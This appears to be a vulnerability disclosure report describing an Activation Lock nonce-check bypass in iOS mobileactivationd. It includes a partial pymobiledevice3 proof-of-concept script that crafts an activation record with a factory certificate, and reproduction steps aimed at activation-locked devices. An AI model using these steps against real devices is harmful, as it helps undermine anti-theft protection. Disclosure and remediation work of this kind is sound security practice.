# Activation Nonce Bypass via Session + Factory Certificate Path

## Issue Description

On iOS 26.3, the HandleActivationInfoWithSessionRequest command in
mobileactivationd contains a logic flaw: when the activation record's
AccountTokenCertificate is the Apple iPhone Activation certificate
(subject: C=US, O=Apple Inc., OU=Apple iPhone, CN=Apple iPhone Activation),
the factory certificate validation path is triggered. This path bypasses
the FairPlay DRM activation nonce check entirely.

The normal activation flow requires:
1. DRM session establishment (drmHandshake with Albert server)
2. FairPlay nonce generation and verification
3. Activation record signature verification

The factory certificate path, triggered by the specific Apple cert,
skips step 2 (nonce verification) and proceeds directly to device
identity validation (Serial, UDID, IMEI/MEID).

This was confirmed by progressive error analysis:
- Without the Apple iPhone Activation cert: "Invalid activation nonce" (nonce check blocks)
- With the Apple iPhone Activation cert: "Invalid Serial/UDID" (nonce check bypassed, identity check)
- With correct Serial/UDID: "Invalid IMEI/MEID" (nonce AND serial checks bypassed)

The nonce check is the primary cryptographic barrier preventing replay
attacks and offline activation record generation. Bypassing it removes
a fundamental security control.

## Affected Component

- Component: mobileactivationd (HandleActivationInfoWithSessionRequest command)
- Platform: iOS/iPadOS 26.3 (build 23D127)
- Device: iPad8,10 (A12Z Bionic)

## Proof of Concept

```python
import asyncio, plistlib
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.mobile_activation import MobileActivationService

async def poc():
    l = await create_using_usbmux()
    ma = MobileActivationService(l)

    # Step 1: DRM handshake with Albert (gets valid session)
    blob = await ma.create_activation_session_info()
    # Forward to https://albert.apple.com/deviceservices/drmHandshake
    # Returns: serverKP, FDRBlob, SUInfo, HandshakeResponseMessage

    # Step 2: Create activation info (device attestation)
    act_info = await ma.create_activation_info_with_session(handshake_response)
    # Returns: ActivationInfoXML, FairPlayCertChain, FairPlaySignature, RK*

    # Step 3: Craft activation record with Apple iPhone Activation cert
    # (cert extracted from restored_update binary in IPSW)
    activation_record = {
        'AccountToken': plistlib.dumps({
            'UniqueDeviceID': 'REDACTED-UDID',
            'SerialNumber': 'DMPC20KDPV13',
            'IMEI': '356622100389197',
        }),
        'AccountTokenCertificate': apple_iphone_activation_cert_der,
        'AccountTokenSignature': signature_bytes,
        'DeviceCertificate': device_ca_cert_der,
        'FairPlayKeyData': fairplay_data,
    }

    crafted = plistlib.dumps({
        'iphone-activation': {
            'activation-record': activation_record,
            'show-settings': 'false',
        }
    }, fmt=plistlib.FMT_XML)

    # Step 4: Submit via session (BYPASSES NONCE CHECK)
    result = await ma.activate_with_session(crafted, {'Content-Type': 'text/xml'})
    # Error: "Invalid IMEI/MEID" (NOT "Invalid activation nonce")
    # This proves the nonce check was bypassed
```

Actual device output progression:
```
# Without Apple iPhone Activation cert:
Error: "Invalid activation nonce"

# With Apple iPhone Activation cert, wrong Serial:
Error: "Invalid Serial/UDID"

# With Apple iPhone Activation cert, correct Serial/UDID:
Error: "Invalid IMEI/MEID"  (nonce check BYPASSED)
```

## Reproduction Steps

1. Connect an activation-locked iOS 26.3 device via USB
2. Pair with the device using pymobiledevice3
3. Extract the Apple iPhone Activation certificate from any IPSW's
   restored_update binary (subject: CN=Apple iPhone Activation)
4. Perform a DRM handshake with albert.apple.com
5. Create activation info with session on the device
6. Craft an activation record with the Apple iPhone Activation cert
   as AccountTokenCertificate, with correct device Serial/UDID
7. Submit via HandleActivationInfoWithSessionRequest
8. Observe that the error is "Invalid IMEI/MEID" (not "Invalid nonce")

## Exploit Conditions

- Prerequisites: USB access to the device, device must be paired
- Attack vector: Local USB
- User interaction: None

## Impact

- The activation nonce check is the primary defense against offline
  and replay activation attacks. Bypassing it means:
  - Activation records don't need to be generated in real-time
  - The FairPlay DRM session is not required for record validation
  - Pre-generated or replayed activation records could be accepted
  - The remaining barriers (certificate signature, SEP key binding)
    are the only defenses left
- Combined with finding #01 (FDR-LOCAL private keys): if FDR keys
  could be used to sign activation records, the nonce bypass removes
  the freshness guarantee
- Combined with finding #10 (FDR trust object HTTP): MITM during
  restore could provide alternate trust anchors, and the nonce bypass
  prevents time-binding of the activation

## Environment

- Device: iPad Pro 11-inch 3rd Gen (iPad8,10, A12Z Bionic)
- OS: iPadOS 26.3 (23D127)
- Tools: pymobiledevice3 9.8.2, Python 3.14

## Suggested Remediation

1. The factory certificate path should NOT be reachable from
   HandleActivationInfoWithSessionRequest in production firmware.
   Gate it behind a hardware fuse check or remove it entirely.
2. The nonce check should be applied uniformly regardless of
   certificate type. No certificate should be able to skip it.
3. Consider removing the Apple iPhone Activation certificate
   from production firmware if it's only needed for factory
   activation.

## Attachments

- Full pymobiledevice3 script with progressive error chain
- Device syslog during activation attempts
- Extracted Apple iPhone Activation certificate (DER format)
